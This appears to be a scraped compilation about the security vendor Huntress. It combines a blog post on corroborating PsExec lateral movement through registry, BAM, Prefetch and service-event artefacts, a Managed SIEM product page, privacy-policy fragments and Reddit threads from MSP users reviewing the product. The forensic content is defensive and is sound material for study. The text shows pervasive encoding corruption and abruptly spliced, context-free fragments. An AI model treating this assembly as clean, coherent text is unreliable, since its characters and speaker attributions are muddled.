      "# [Triangulation](https://www.huntress.com/blog/triangulation)\nOnce upon a time, I had my butt handed to me in a post-incident response debrief.\n\nI thought it was a good report. It was actually one of my first, many years ago.Â\n\nHowever, one or two executives in that debrief session began to question the credibility of the report. âWhy wasnât it one hundred pages?â, and âhow could you say for sure something happened during a window of time?â, and even âhow can we be sure youâve given this your full attention?âÂ\n\nSmelling blood in the water, one dissenting voice turned into a frenzy of sharks all trying to take a chunk of my derriere. The rest of that session was not spent explaining the nuance of their intrusion, but instead re-gaining the trust, credibility and confidence that my report had failed to instill in the client after their incident.Â\n\nAn unlucky constellation of factors meant one of my first IR reports was not well-received. Some of it was my inexperience and very apparent youth. A major failing was that I had not used the report to its full potential; I had failed to use the report to establish the impression of credibility in my reader.\n\nTriangulating for Credibility\n\nWe are intertwined in our incident reports, our summary of new zero-days, our Twitter threads.Â A bit of ego and vanity goes into technical writing, and any doubt about the efficacy of what we are writing is, by extension, a doubt of our credibility.\n\nI donât want you to flail at the first hit of criticism. Instead, I want you to protect your vanity and reputation by leaving your reader with zero doubt that you are an expert who makes well-founded, evidence-driven conclusions. With and through evidence, youâll be speaking with impeccable authority.\n\nTriangulation is an investigative concept from the social sciences we can kindly borrow and transpose. Here, the investigator enriches the validity and reliability of their claims by leveraging multiple methods and layering evidence from multiple sources of data that all speak to the same phenomenon.Â\n\nPut more specifically for infosec folk, triangulating involves using multiple sources of telemetry on a machine to hone in one theory at a time to disprove or prove it.Â\n\nAfter that terrible debrief session, I changed the way I wrote. Triangulation was one of many techniques I deployed to ensure a reader received (implicitly or explicitly) the impression that this report was as close to fact as possible, and I was an investigator of good repute and attentiveness.Â\n\nNow, you and I know that I am a clown (if not the whole circus) for most things, even if your only exposure to me has been through my blogs. But not when it comes to reportsâI mean business when I write reports. And I would like you to also mean business when you write your reports.Â\n\nI would like you to write technical reports that contain zero assumptions or assertions and instead act as your own first-layer peer-reviewer. You can triangulate your findings to corroborate your hypotheses, theories and ideas, and produce reports that convey unshakable confidence in your reader as well as contain technical excellence.Â\n\nTriangulation IRL\n\nWhen have I ever given you the recipe without bringing something fresh out the kitchen too? Weâll use a real case as an example of how triangulation can be used in real investigations.Â\n\nJust the other day, my colleague Cat Contillo and I found some spare time to do some honest security work. We had an alert come through that was a bit too vague for our liking, so we decided to flesh it out and make a report for the partner that had a good context with even better actionable findings.Â\n\nWeâre rarely so fortunate to have good security-enabled Windows Event logs on any given machine. On this occasion, Cat and I didnât find much from the logs, but we did leverage some digital forensic artefacts to mount our investigation from.Â\n\nThe alert we received was about potential lateral movement that ended up being PsExec. We could have just sent a generic report that did the bare minimum of communicating a threatâ¦.but thatâs not our style. Instead, we leveraged a number of data sources in order to tell a far more detailed, convincing story that offered the partner confidence in our report and our recommendations.\n\nTo triangulate PsExec, Iâll recreate our investigation and show you a couple of cool artefacts we can collect, contrast and compare:\n\nThe Windows registry data related to PsExec\n\nThe record from Background Activity Moderator (BAM)\n\nThe frequency of execution from PrefetchÂ\n\nA Moment on PsExec\n\nOur enquiry should lead with a good foundation of the phenomenon we want to study. So letâs dwell on PsExec for a moment.Â\n\nPsExec is a legitimate system administration tool as much as it is a tool for adversaries to laterally move in a domain. In our example for this article, when we launch PsExec from our host machine (Thornfield), weâre creating a remote session in the target machine (MoorHouse), and gain an interactive session with our âJEyreâ user.Â\n\nSimplified explanation. For greater detail, please read ExtraHops' blog post.\n\nAn unappreciated part of PsExec is the reciprocating agent that ephemerally appears on the target machine.\n\nMonitoring for PsExeSVC.exe to pop up somewhere in your environment is a great opportunity for detection. A PsExec connection will instigate an EventID 7045 (Service) on the target machineâs System.evtx for PsExeSVC. It will offer the connection time for us to focus on, as well as confirm the user account via SID (which Iâll show you how to convert in a minute).\n\nBut note, adversaries can control the service name by using the `-r` flag on PsExec, and is therefore not a foolproof method of detection.Â\n\nNow we have spent some time on PsExec and gathered ourselves a few basic facts about investigating, let's take it up a notch and see what artefacts we can triangulate to tell a fuller story.\n\nEULA Accepted in the Registry\n\nAttackers can try to change the name of the PsExec executable itself to evade detection, but something theyâre less likely to evade will be the impact on the Windows registry.Â\n\nWe can take a look in our registry for the EulaAccepted, which will appear with the value ofÂ â1â if PsExec has been dropped on this machine and the EULA pop-up has been accepted.\n\nWe can look across the registry from HKEY_USERS to identify which user accounts (via their SIDs) have leveraged PsExec.\n\nHKEY_USERS\\S-*\\Software\\Sysinternals\\PsExecÂ Â\n\nHowever, notice we donât get a corresponding username gifted to us. Instead, we get the long SID string. To convert that to a username, try this:\n\nâ\n\nOr over-engineer a solution!\n\nAn issue with wrapping up our investigation here and now is that we have no clue when the registry was changed / when and if PsExec was actually executed.\n\nIf a user account previously and legitimately used PsExec, that now brings into doubt the validity of assumption that THIS particular PsExec activity was the threat actor and was malicious.Â All we can conclude from the registry data is that PsExec has been on disk and associated with the JEyre account.Â\n\nBackground Activity Moderator (BAM)\n\nBackground Activity Moderator is an interesting source of telemetry, seemingly available from Windows 10 onwards.Â\n\nIâve heard claims BAM can ONLY be found on Win10 machines, but this is definitely not trueâthe data below has all been pulled from a Windows Server (Server 2022, Version 2009 Build 20348). However, I cannot claim to have any semblance of knowledge on exactly which OS, builds and versions BAM is and is not present for. ð¤·\n\nBAM is useful for illuminating the full path of an executed program, the time it was executed and the SID / user account associated with this execution. This offers us a layer of evidence different from that of the EULA Accept, which could tell us PsExec once existed under JEyre but couldnât offer a time.\n\nTo query BAM, youâve got two options:Â\n\nThe first is to simply manually look at the registry data. This can be messy and does not convert SIDs for you, but boy ainât it nice to get your hands dirty sometimes?\n\nThe second is to leverage Matthew Greenâs Get-BAMParser.ps1 PowerShell script, which includes a nicer format and converts SIDs to user accounts. I made a change request on this script so it would work with Server 2022.Â\n\nIf manual: you donât need a fancy script! Just good eyes. What we lose here, however, are timestamps.Â\n\nAnd if you use the script, be ready to ZOOM in. We get timestamps via the PowerShell script, which is a huge and necessary layer of evidence.\n\nAnalyzing BAMâs data on PsExec gives us the user account JEyre with the full path of execution. This is useful, as it corroborates what the EULA registry data stated about JEyre, and now we have specific directories that we can go and investigate to see if the threat actor dropped any other tools. Moreover, BAM offers a wider context of some activities that occurred, and we can start to contextualise what the threat actor did while they were in our environment.Â\n\nA limitation of BAM is that it trusts the executable name. If we rename it NotPsExec.exe that is how BAM will record it and report it back to us after parsing. Unlike checking the EULA registry data, which confirms PsExec was run and accepted, BAM goes off the sincerity of the executable name. Moreover, BAM offers little clarification on the frequency of execution. Is this the first time, or last time, or any time that the threat actor used JEyreâs account to PsExec?\n\nWe have a much clearer picture than when we started. But now we need to start gathering actionable information for our reader.\n\nPrefetch\n\nIâve spoken about prefetch before. It is automatically disabled on Windows Servers, but can be enabled with ease. If youâre unable to leverage prefetch to triangulate, might I suggest Amcache and Shimcache instead.Â\n\nYou can gain some early insight by looking in the prefetch directory on the host. Things executed will have a .PF file, but just looking at this directory alone is useful.\n\nÂ\n\nYou can pick up a .PF file and parse it using Eric Zimmermanâs PECmd tool:\n\nBy leveraging prefetch, we gain something quite interesting that we did not have before: precise frequency of execution. We are told that an executable called PsExec.exe ran six times, and the run times are put precisely. Moreover, from prefetch, we do not get a user account confirmed, but we do get insight on the directories referenced when PsExec was evoked.\n\nI say an executable called PsExec.exe, because prefetch is not able to qualify the executable name. Like BAM, it trusts the executable name and bases the recording of data from that name. So if this was renamed NotPsExec.exe, that is what we would see.Â\n\nHowever, name manipulation does not make prefetch data useless. We can continue to triangulate our findings by pivoting over to the target machine. In the targetâs prefetch directory, we can find record of PsExeSVC.exe: the reciprocating agent to PsExec.Â\n\nBy parsing PsExeSVCâs prefetch file, we get a more certain timestamp. This assumes the threat actor did not change the service name (as we have noted), but we can see a far much specific time that grounds our above six PsExec times from prefetch.\n\nAnd going full circle in our triangulation, we actually already saw this timestamp when we looked at EventID 7045âs in the System log of the target machine. Thus, we have near factual conclusions about the time of activity.Â\n\nA limitation of prefetch is that it first has to be present on the host, and second that it lacks the ability to attribute user accounts and is too trusting of the sincerity of executable names. But these flaws are addressed by the information in other telemetry we have leveraged, and moreover, we now have a better window of time that we can offer our reader for malicious activity.\n\nLayers of Evidence\n\nLike layers of Swiss cheese, the different sources of telemetry individually have gapsâbut combined, they make a more cohesive block; a more definitive, credible story is told once we amass and triangulate our data.Â\n\nOur report about the lateral movement has been nuanced by our triangulation. We were able to confirm the lateral movement was indeed Psexec via the 7045s in the System log, the data in the EULA and in BAM in the registry, as well as prefetch that added greater nuance about frequency and path location.Â Â\n\nBy triangulating these different sources of telemetry, and using each of their strengths to compensate their weaknesses, we gathered incredibly specific data that our readers can take action on. We corroborated the user account associated with PsExec (JEyre), we established the directories involved (C:\\Users\\JEyre\\Downloads\\PsTools), and established a window of time with (April 2022 April 4th 02:32 - 03:17 UTC).\n\nI hope Iâve successfully conveyed that triangulation is a worthy concept to stay conscious of during an investigation. Chances are youâre doing it already, and now you know a fancy word for it.Â\n\nThe point of triangulation isnât to prove the same things ten times over. The point of triangulation is to know the limitations of an individual digital forensic component, and to assemble a number of these artefacts to compensate and bring with them unique findings that add nuance to the phenomena we are investigating.Â\n\nWrapping Up\n\nWe all know that the executive summary on page one will be where most readers begin and end. We might want people to read our reports in their entirety. But we also want our readers to trust usâto trust our recommendations and findings from page one onwards.\n\nThrough triangulation, we can offer reports that are laden with actionable information for a reader to run withâand the confidence that we, the investigators, have reported as close to fact as possible.\n\nWe donât have to write verbosely to communicate our findings; itâs about specific language and certain phrases that demonstrate you are an investigator speaking with evidence-ordained authority on this matter. Maybe at some point, Iâll write about some of the particular vernacular I adopt when Iâm writing up reports (stay tuned). At any rate, I hope you enjoyed reading about triangulation, and I hope it saves your behind when you next have to report to a technical senior or executive.Â\n\nA major limitation of triangulation is that it requires the investigator to know and have access to multiple data sources that can all speak to a phenomenon they are studying. I donât have a good answer for this one I am afraidâyouâll just have to check out some of the material in the DFIR community and start leveling yourself! Or you can just keep following my articles on our Huntress blog. ð Why not both!?",

      "# [Managed SIEM](https://www.huntress.com/platform/siem)\nSIEM, or security information and event management, was initially designed as a means to collect multiple disparate log sources and store the data under one centralized platform. Correlation rules took this one step further by adding a means to create alerts on the log data retrieved. Historically the use case for SIEM is built around: the collection/storage of logs, compliance, and threat visibility. The common problems with SIEM based on the âconsume all data'' approach are cost, training/skill to deploy and manage, and lastly, defining useful data from the noise.\n\nHuntress Managed SIEM was built from the ground up to solve the problem of data overload, unfiltered sources, and alert fatigue. Our Managed SIEM redefines the industry standard by applying Smart Filtering capabilities at the log source to only capture threat-specific logs. This simplifies the workload toward threat discovery and data retention. Managed SIEM is also built to collect Windows-based events and syslog using the same proprietary agent youâre familiar with. Supported by our AWS backend, your data is stored, safely and reliably.\n\nTraditional firewalls and antivirus is simply not enough. The time to discover incidents is about six months. Finding and targeting attackers quickly is only possible with a full picture of log data as a whole. SIEM creates a bird's eye view of log data to quickly identify an attacker's tracks using correlation analysis and Smart Filtering.\n\nThe Huntress team designed and built Smart Filtering from the ground up. While most vendors depend on the source (firewall, endpoint, router) to apply its own filters, we directly filter the log data using our proprietary filtering engine, acting as a sieve to collect only critical information from log sources.\n\nManaged SIEM can quickly integrate with existing infrastructure using the current Huntress EDR agent. Log data is captured using either the Huntress agent or Syslog collection and is forwarded to S3 in AWS for data storage. Searchable or âhot storageâ data is then relayed into Clickhouse for rapid visibility within the Huntress UI.\n\nWhile the Huntress EDR agent is designed for rapid response-based actions at the endpoint, our Managed SIEM offering relays host Windows event and syslog data to our backend for further analysis and log storage. SIEM data is stored and hosted by the Huntress team for storage for up to a year by default.",

See our Subprocessor List, available at www.huntress.com/legal, for more details. However, we have taken appropriate safeguards to require that your Personal Data will remain protected in accordance with this Privacy Policy.

To determine the appropriate retention period for Personal Data, we consider the amount, nature and sensitivity of the personal information, the potential risk of harm from unauthorized use or disclosure of your Personal Data, the purposes for which we collect or process your Personal Data and whether we can achieve those purposes through other means, and the applicable legal requirements.

So what exactly do they do? I even sat down for a sales call and I'll be honest I still don't get it.\n\nI know they are universally loved pretty much, and I want to deploy them and have them as a partner!\n\n## Comment ID hybrw74 with +52 score by [(andrew-huntress, Reddit, 2022-02-25)](https://www.reddit.com/r/msp/comments/t0msza/what_exactly_is_huntress/hybrw74/) (in reply to ID t0msza):\nThanks for tagging me /u/Quadling - I saw this thread earlier and was surprised to see how much attention it got. I typically prefer to let the community run with discussions like this but am happy to share my thoughts when asked!\n\nAs many correctly stated, the core of the Huntress service had always been footholds, or persistence. /u/computerguy0-0 did a great job in explaining how our service fit into the \"detect\" category of the NIST framework. [We played here exclusively for quite some time](https://i.imgur.com/VeW6WFK.png) and built our reputation by being the absolute best at detect and respond. \n\nIn [the last 24 months](https://i.imgur.com/tCfq9x5.png), we've added [Assisted Remediation](https://support.huntress.io/hc/en-us/articles/4404005119251-Understanding-Huntress-Incidents#Remediation), [Ransomware Canaries](https://support.huntress.io/hc/en-us/articles/4404005090067-Ransomware-Canaries), [External Recon](https://support.huntress.io/hc/en-us/articles/4404012768147-External-Recon), [Managed Windows Defender](https://support.huntress.io/hc/en-us/articles/4404005212691-Managed-Microsoft-Defender-Antivirus-Overview), [Host Isolation](https://support.huntress.io/hc/en-us/articles/4404960349459-Host-Isolation-Beta-) and have expanded our team globally to provide true 24/7 threat hunting.\n\nIn May of 2021, [we raised $40 million](https://www.huntress.com/blog/huntress-series-b-our-next-chapter-of-growth) in **minority VC investment** (no PE shenanigans here) with the intent of [going beyond detect and respond](https://i.imgur.com/ZDq8AYk.png). \n\nWe [acquired a company and their EDR technology](https://www.reddit.com/r/msp/comments/kvui00/huntress_acquires_networkaware_edr_technology/) around the same time and spent the last year rebuilding this from *the ground up* getting ready to introduce this functionality to our partners. This EDR functionality release was a [hot topic a few weeks ago](https://old.reddit.com/r/msp/comments/sjhld7/huntress_managed_av/) and for those of you who don't want to check out that thread, it will begin rolling out to partners starting on 4/1. \n\nWe have a ton more on the roadmap both for the rest of 2022 and 2023 and I believe we'll be doing a townhall style webinar in mid April to share those plans with the world. Hope this helps!\n\n### Comment ID hydxei5 with +3 score by [(AccidentalMSP, Reddit, 2022-02-25)](https://www.reddit.com/r/msp/comments/t0msza/what_exactly_is_huntress/hydxei5/) (in reply to ID hybrw74):\nThis is the first I'm hearing of the EDR. I think it's great news and I hope that it elevates you from the awkward  in between stage where your neither AV, nor EDR, nor SOC.

Large then-unmanaged client hit with ransomware. Combined with switching AV away from Webroot (which did almost nothing against it), Huntress allowed me to not only get ahead of it, but prevent remnants (the 'footholds' Huntress looks for) from activating and continuing to spread.\n\n## Comment ID hybjj5p with +22 score by [(Imburr, Reddit, 2022-02-25)](https://www.reddit.com/r/msp/comments/t0msza/what_exactly_is_huntress/hybjj5p/) (in reply to ID t0msza):\nIn addition to all of the other things said in this thread, Huntress has been instrumental in the MSP community in raising awareness about security. They have partnered with MSP's, and they seem genuinely interested in helping MSP's and their clients be more secure. Usually during a zero-day, or large scale breach, you will find Kyle/Huntress leading the charge with forensics, information, and remediation.\n\nWe had a ransomware event a few years ago at a client and Huntress was on the phone with us, coaching and giving good advice, from square one. I think had it not been for them the outcome would have been much different.\n\nAttend a Tradecraft Tuesday webinar with these guys, its fascinating.\n\n## Comment ID hyaykiy with +15 score by [(d3cay, Reddit, 2022-02-24)](https://www.reddit.com/r/msp/comments/t0msza/what_exactly_is_huntress/hyaykiy/) (in reply to ID t0msza):\nSo they mostly look for what they call footholds.  Usually services, scheduled tasks or other junk usually left behind after malware is cleaned up or before malware is deployed during a breach.  They provide a nice actionable report on what they find, the report has detailed actions for remediation.  They also provide a button to allow the agent to remediate for you.  \n\nWe use it along side Sentinel One, it has been great.\n\n### Comment ID hyb5o04 with +10 score by [(wheres_my_2_dollars, Reddit, 2022-02-24)](https://www.reddit.com/r/msp/comments/t0msza/what_exactly_is_huntress/hyb5o04/) (in reply to ID hyaykiy):\nWhat has been great?

It finds all kinds of things left behind from malware that has been cleaned up in the past. Even in environments that have both Huntress will find a few things S1 doesn't.

Threatlocker is application whitelisting. It fits in with \"Protect\".  \n  \nHuntress fits in with \"Detect\".  \n  \nhttps://www.nist.gov/cyberframework/online-learning/five-functions  \n  \nHuntress is there to see someone gaining permanent access, \"a foothold\", to a computer. There are only so many ways to establish a foothold and Huntress covers all of them on a Windows OS. This is backed by the human element.  \n  \nThe appeal of the product is quick identification. You want to catch the bad guys getting in as soon as possible so you can stop them as early as possible to minimize damage.  \n  \nYES, other products such as S1 do detect persistence, Huntress cleans up a lot of the noise that other products typically make to only actionable events, again, sometimes reviewed by a human in a timely manor. Plus, for big events, Huntress actually gives a damn and calls their partners.  \n  \nI heard from TWO companies during the Kaseya breach, Huntress and Blackpoint. I wasn't even a partner at Huntress yet. I am now a partner of both and deploy both to various customers at my MSP. It's well worth having them on my side when something inevitably goes wrong.",

In fact, I have seen and worked with many public disclosures from them. Love their work and now I am curious:\n\nWhat exactly is their huntress product? I understand that I can connect it to SentinelOne for example and they will do threat hunting. Does it replace a SOC though? Will they handle it, when SentinelOne finds something? What will they do exactly?\n\n## Comment ID jz7rvg8 with +19 score by [(None, Reddit, 2023-09-05)](https://www.reddit.com/r/msp/comments/16ahw3s/whats_the_point_of_huntress/jz7rvg8/) (in reply to ID 16ahw3s):\n[deleted]\n\n### Comment ID jz93jzy with +9 score by [(Independe407, Reddit, 2023-09-05)](https://www.reddit.com/r/msp/comments/16ahw3s/whats_the_point_of_huntress/jz93jzy/) (in reply to ID jz7rvg8):\nI would just add that while EDR systems excel in monitoring and reacting to threats on endpoints, they can overlook critical events occurring in other parts of the infrastructure, like the cloud or the broader network. Huntress doesn't really have visibility beyond endpoints today. This limited scope does create some blind spots and potential risks.  \n\n\nThey also don't really offer the ability to choose the vendor of your choice. So if you use S1 or Bitdefnder or another endpoint security product, they can't monitor it nor can their SOC to take response actions.\n\n#### Comment ID jzameiz with +5 score by [(m9832, Reddit, 2023-09-05)](https://www.reddit.com/r/msp/comments/16ahw3s/whats_the_point_of_huntress/jzameiz/) (in reply to ID jz93jzy):\n>  Huntress doesn't really have visibility beyond endpoints today. \n\nYou should look at their MDR for 365 offering.

A very unique and important one.\n\nFor context, we run three EDR platforms on our managed endpoints. About a year ago we hired a penetration testing firm and had them run an assumed breach scenario to test our endpoint security. They had physical access to the machine and a user login. Halfway through the test period, we upgraded this to local admin account.\n\nWindows Defender is turned on with Defender for Endpoint P1 via M365 Business Premium license. For this test it was out of the box configuration on Microsoft's end, running recommended settings from Huntress. This was the first layer of defense and did well in blocking initial access attempts. Huntress caught and recorded, but did not alert on, the blocked attempts (this is intentional, thier systems are tuned to alert on active, live threats not blocked ones).\n\nTodyl EDR (custom, highly tuned Elastic/Endgame engine) kicked in as the second layer. Thier SOC alerted to the threatening activity and isolated the endpoint within 10 minutes. As a result of this testing, they now pull in and analyze alerts from Defender as well. \n\nHuntress is the backstop. The supporting and most important layer, in my opinion. Thier systems and SOC detect, alert and action on threats that have bypasses every other platform. Because they use whitelist-based methodology for persistent activity, they will catch those sneaky, manual attacks that slip by everyone else. For us, when Huntress alerts, it's an immediate all hands on deck, red alert, defcon 1 scenario. It means something is active on the system and has bypassed the blocking layers.\n\nHuntress can absolutely run standalone on a system alongside Defender and do a phenomenal job. They will catch all the bad things. That said, they are also not a full SOC/SIEM solution. If detailed or customized alerting is important, you should have additional defensive layers in place. This could be SentinelOne, Todyl, Crowdstrike, etc.\n\nThis doesn't even begin to touch the Huntress contributions to this community. They are always on top of the latest threats and actively hunting them across every endpoint. If something big is going down, your first notification will be from Huntress. They are the only security vendor who is willing to take intelligent, proactive action to protect thier clients. Such as deploying files or registry keys that block widespread attacks, as they did in the Kaseya breach.\n\nIf I was limited to a single security vendor, Huntress would be my choice.\n\n### Comment ID jz919p2 with +10 score by [(matt0_0, Reddit, 2023-09-05)](https://www.reddit.com/r/msp/comments/16ahw3s/whats_the_point_of_huntress/jz919p2/) (in reply to ID jz86jeq):\nI acknowledge this is pretty nitpicky... but as far as I'm aware, this chart is still accurate\n\nhttps://tminus365.com/wp-content/uploads/2021/11/pic2.png\n\nSuch that P1 (comes with M365 E3) is significantly less featured than Defender for Endpoint Business edition (comes with Business Premium).

We have a number of clients that use both. When we address ransomware, we will sometimes ask the MSP to contact Huntress for a trial while we deploy SentinelOne Complete with DV and Vigilance SOC to see if Huntress can find fragments SentinelOne might not find, or the opposite.\n\nHaving two SOCs can certainly be a challenge when addressing incidents or operating day to day.\n\nIt's also pertinent to remember Vigilance SOC is a remediation SOC meaning they address the issues they discover. With their new release of Spotlight threat hunting, they've made the process far, far easier and my SOC guys certainly love it. There are some alternatives that work quite well. In the 5 years, and 30k endpoints we get from SentinelOne, all with the Vigilance SOC, we've not wanted for anything more. Perhaps a more integrated and affordable platform, which we are moving to. Even in complex ransomware incidents where we've deployed it, and other platforms, for remediation it's performed quite well.\n\nSo to summarize, You can operate with one or the other without missing too much. If you're dealing with a ransomware incident, then perhaps engaging both and a remediation team would make sense.\n\nIf you're looking for unbiased info on platforms, check out the Mitre Enginuity Caranabak/FIN7 Wizard Sandstorm ransomware tests where they provide the results and each sub-section findings in the open for all to see.\n\nIf you don't already attend the Huntress Tradefraft Tuesday webinars, I highly recommend them.\n\nIf you're looking for more 'all in one' options, take a look at Blackpoint Cyber as one alternative. There are a few 'all in one' solutions newly introduced to the channel that simplify providing cybersecurity to the end-client. Blackpoint is one. In our recent testing of Blackpoint, it did an impressively good job against the ransomware VMs we got from CISA and from other sources. Their Office365 security is also impressive.\n\n### Comment ID jz80gvd with +2 score by [(icedcougar, Reddit, 2023-09-05)](https://www.reddit.com/r/msp/comments/16ahw3s/whats_the_point_of_huntress/jz80gvd/) (in reply to ID jz7gsnz):\nFew questions,\n\nSpotlight - is this for huntress or s1, as I’ve never heard of it unless you mean skylight (XDR)\n\nVigilance - when you say this do you mean vigilance or vigilance PRO\n\nIf you’ve used both vigilance and vigilance pro… what’s the real difference?\n\n(I use s1 complete, DV, skylight, vigilance, watchtower)\n\n#### Comment ID jz8g0nq with +2 score by [(FutureSafeMSSP, Reddit, 2023-09-05)](https://www.reddit.com/r/msp/comments/16ahw3s/whats_the_point_of_huntress/jz8g0nq/) (in reply to ID jz80gvd):\nI meant Skylight.

While good, I feel like some of these bugs should have been caught in the beta phase. What is everyone else's thoughts?\n\n[https://feedback.huntress.com/changelog](https://feedback.huntress.com/changelog)  \n\n\nEdit: A few examples of things that I feel should have been discovered earlier:  \n\n\n1. *\"We found that when we were importing existing inbox rules for M365 users during Huntress onboarding, we were not generating alerts for our SOC analysts to report. It turns out that we had a bug that caused the events not to match the detectors, so we were not able to report on malicious inbox rules that existed before we were deployed and started to receive the Microsoft 365 events from the audit log.\"*\n2. \"*We found that in some cases, we were missing detections because the maximum number of hits an Elasticsearch rule was able to have was 100. This meant that if there were too many matches in a short time period, not all matches would be returned. This one was not obvious, because you don't know what you don't know, but we identified some events that we thought should have generated signals and did not and we've seen this issue with Elasticsearch before.\"*\n3. **Feel like these should have been baked in already.** *\"I don't know how helpful listing the new detectors we're adding will be, but we've gotten a decent number of requests from folks to help them understand what types of things we're detecting, so here are a few new detectors we shipped:*\r  \n*Login from VPN*\r  \n*Login from proxy*\r  \n*Login from brute force IP*\r  \n*Login from TOR*\r  \n*Login from new region*\r  \n*Login from RDP\"*\n\n## Comment ID kd2kjmo with +32 score by [(None, Reddit, 2023-12-12)](https://www.reddit.com/r/msp/comments/18gptkf/huntress_has_made_some_mdr365_updates/kd2kjmo/) (in reply to ID 18gptkf):\n[deleted]\n\n### Comment ID kd48s68 with +7 score by [(glibbertarian, Reddit, 2023-12-13)](https://www.reddit.com/r/msp/comments/18gptkf/huntress_has_made_some_mdr365_updates/kd48s68/) (in reply to ID kd2kjmo):\nThey have VC money that needs to see a return.\n\n#### Comment ID kd4zqbc with +3 score by [(cablemps, Reddit, 2023-12-13)](https://www.reddit.com/r/msp/comments/18gptkf/huntress_has_made_some_mdr365_updates/kd4zqbc/) (in reply to ID kd48s68):\nReally?

Like all products it’s gonna have bugs, even out of beta. It’s also gonna get better as a product because beta feedback is 99% “quash this bug” and “where’s the doco?”, real user feedback starts at real use, and if I know anything about Huntress and I think I do, they’re gonna load features into this thing that will make you cry from happiness.\n\n## Comment ID kd28a8i with +6 score by [(jackmusick, Reddit, 2023-12-12)](https://www.reddit.com/r/msp/comments/18gptkf/huntress_has_made_some_mdr365_updates/kd28a8i/) (in reply to ID 18gptkf):\nIt sounds like from #3, that means it considers impossible travel now, right?\n\n### Comment ID kd2g6m0 with +9 score by [(chrisbisnett, Reddit, 2023-12-12)](https://www.reddit.com/r/msp/comments/18gptkf/huntress_has_made_some_mdr365_updates/kd2g6m0/) (in reply to ID kd28a8i):\nWe are looking at the locations and trying to determine impossible travel.

The fact that we were only seeing the first 100 matches for a detector wasn't obvious and didn't trigger until we started to bring on more partners to where we would have that many hits. We would have had a better chance of detecting this if we had built in more observability from the beginning, but it's always a tradeoff. Spending a lot of time on observability and ignoring features and onboarding customers doesn't get you much. It's about balancing the two. We're spending more time on observability stuff now to make sure we can identify any regressions in the future.\n\nWe would have liked to have some of these baked in from the beginning, but for most of these to work we had to build in the additional context and ingest data from third-party sources where they are the experts. To know if a user is logging in from a new location requires you to store and query all of the prior locations for the user, which we had to build out. Unlike other services, we didn't want our partners to have to go in and specify which countries or regions were allowed for thousands of M365 users. That's untenable. Other vendor solutions have hard-coded rules for things like M365 users outside of the U.S., which is also not going to work for a lot of folks. It took a bit of time to build these.\n\n### Comment ID kd2mozj with +3 score by [(evilmuffin99, Reddit, 2023-12-12)](https://www.reddit.com/r/msp/comments/18gptkf/huntress_has_made_some_mdr365_updates/kd2mozj/) (in reply to ID kd2fb4n):\nSome of that does make sense.

Usually this comes in the form of detections. If we feel that it can detect malicious activity, we want to get it in peoples hands so they can start using it and we can capture more data and with more data we can improve the detection capabilities.\n\nIn this case we were detecting things and sending incident reports and customers were largely happy. In cases where we had missed things during the beta we had adjusted and felt that we were now detecting those things. What surprised us was when we opened it up to general availability and started on-boarding more partners we found that with a larger sample size we had more things that we missed and we didn't iterate as fast as we should have on those to close those gaps.\n\nSo we felt like releasing this was going to help our partners find malicious activity within their M365 tenants, and that's why we moved forward with it.\n\n#### Comment ID kd4bqmt with +2 score by [(mpethe, Reddit, 2023-12-13)](https://www.reddit.com/r/msp/comments/18gptkf/huntress_has_made_some_mdr365_updates/kd4bqmt/) (in reply to ID kd2mozj):\nI was definitely given the impression when I demo'd it that it was going to detect impossible travel type logins.

Since deploying, they have found a few minor incidents that required remediation and in each case provided a good explanation for what happened as well as steps to correct the issue.  The automated remediation is awesome but if you want to do things manually they provide steps to do that.\n\nMost recently, they were front and center working on the 3CX breach.  I had some machines with the vulnerable application installed.  I was notified of each impacted machine before any damage was done and I was able to quickly respond with removal scripts to eliminate the vulnerable software.  On top of that, my account rep reached out to me to make sure I was aware of the 3CX incident.\n\nOn the business side they have been great to deal with.  A few months ago my account rep reached out to me to offer a different tier, not advertised on the website, that was able to save me money.  After finding out that they can now bill in Canadian currency she worked diligently to revise my agreement which is also saving me money and making my costs predictable.\n\nPrior to using Huntress I was running S1, and it's a great product.

I feel really comfortable with both S1 and Huntress on machines.  I understand there is an additional cost with these though.\n\nAnother major thing to consider, like others have mentioned, is the incredible resource Huntress is for the entire community.  They do regular webinars with engineers which are a great resource to get on the pulse of what they are seeing.  And the response to pretty much every major incident over the last few years has been spearheaded by Huntress with real world data, expert advice, and remediations (which sometimes will be pushed automatically by them).  Your money and endpoints help keep that going.\n\nI feel like a Huntress evangelist or shill, but we are so lucky to have such an open, useful resource.\n\n### Comment ID jfapua4 with +1 score by [(Truman_IRL, Reddit, 2023-04-07)](https://www.reddit.com/r/msp/comments/12cunua/huntress_worth_the_money/jfapua4/) (in reply to ID jf3na0t):\nWe just made the switch from S1 to Huntress and I agree they’re absolutely amazing.

You will not find a product that can perform how Huntress performs at anywhere near the price. In addition to its standalone capabilities, the ability to manage Defender is the cherry on top.  Easy deployment and ticketing integration makes it very set and forget.\n\nAlso included is External Recon. It uses Shodan to port scan every public IP an agent beacons from. This was an easy way for me to audit our clients to ensure that only required ports are exposed.\n\nMy only caveats..\n\nYou have to remember to manually map any new clients to the corresponding client in PSA.\n\nSeems easy to defeat (no anti-tamper) but no one is targeting it. By the time I ran a NLTEST and pinged a DC from a Huntress protected box, Huntress fired a ticket into PSA.\n\nIt provides a nice indicator of what machines Defender agents are borked on but fixing these is time-consuming---but this is more of a Defender issue.\n\nAs a co-managed SOC platform, Huntress' only action is host-isolate.. but in those critical instances.. it totally works. Ticket fires into PSA and you are getting a phone call from a Huntress engineer stepping you through what actions to take. \n\nAgain there are other more expensive SOC platforms out there that can take more actions but if you are doing a standard offering for your clients and an elevated security offering, Huntress fits right into that price/performance bracket for a standard offering.\n\n### Comment ID kpidiw1 with +2 score by [(hirs0009, Reddit, 2024-02-08)](https://www.reddit.com/r/msp/comments/12cunua/huntress_worth_the_money/kpidiw1/) (in reply to ID jf8wuqo):\nI just sat through a sale presentation and honestly it looks like the product is kind of a half measure with many holes.

Each device is considered an endpoint, and you only get charged for the endpoints you have under management at the end of the month. There are additional discounts once you hit like 200 endpoints I think. It's volume based pricing so the more endpoints you eventually have the bigger of a discount you get.

It could be used standalone, standalone with Defender, or you can utilize it with S1 however they don't talk to each other.\n\nSentinel one does not really have a MDR. You either need to know how to use it or hire a company that does and they'll set it up for you. Once you set it up it needs to be periodically updated with the rules and file hashes but generally once set up requires minimal maintenance.\n\nThe reason we use both is because sometimes Huntress will catch something that S1 does not and vice versa.

